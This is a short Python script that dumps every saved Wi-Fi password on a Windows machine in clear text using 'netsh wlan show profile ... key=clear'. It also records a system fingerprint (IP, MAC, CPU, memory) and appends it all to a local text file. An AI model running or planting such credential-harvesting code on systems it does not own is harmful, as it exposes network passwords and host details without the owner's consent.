# It imports the modules that will be used in the script.
import re
import psutil
import subprocess
import platform
import socket
import uuid


def main():
    def get_size(bytes, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor

    def extract_wifi_passwords():
        profiles_data = subprocess.check_output(
            'netsh wlan show profiles', encoding='CP866', errors='ignore').split('\n')
        profiles = [i.split(':')[1].strip()
                    for i in profiles_data if 'Все профили пользователей' in i]

        def for_pass():
            arr = ["-------- Wifi Passwords --------"]
            for profile in profiles:
                profile_info = subprocess.check_output(
                    f'netsh wlan show profile {profile} key=clear', encoding='CP866', errors='ignore').split('\n')
                try:
                    password = [i.split(':')[1].strip()
                                for i in profile_info if 'Содержимое ключа' in i][0]
                except IndexError:
                    password = None
                arr.extend((profile, password))
            return ("\n".join(map(str, arr)))
        return for_pass()

    uname = platform.uname()
    cpufreq = psutil.cpu_freq()
    svmem = psutil.virtual_memory()
    cpu_information = (f'-------- System Information --------\nSystem: {uname.system}\nNode Name: {uname.node}\nRelease: {uname.release}\nVersion: {uname.version}\nMachine: {uname.machine}\nProcessor: {uname.processor}\nIp-Address: {socket.gethostbyname(socket.gethostname())}\nMac-Address: {":".join(re.findall("..", "%012x" % uuid.getnode()))}\n-------- CPU Information --------\nPhysical cores: {psutil.cpu_count(logical=False)}\nTotal cores: {psutil.cpu_count(logical=True)}\nMax Frequency: {cpufreq.max:.2f}Mhz')
    memory_information = (
        f'-------- Memory Information --------\nTotal: {get_size(svmem.total)}\nAvailable: {get_size(svmem.available)}')
    
    with open(file='full_info.txt', mode='a', encoding='utf-8') as file:
        file.write(
            f'{extract_wifi_passwords()}\n{cpu_information}\n{memory_information}')

if __name__ == '__main__':
    main()
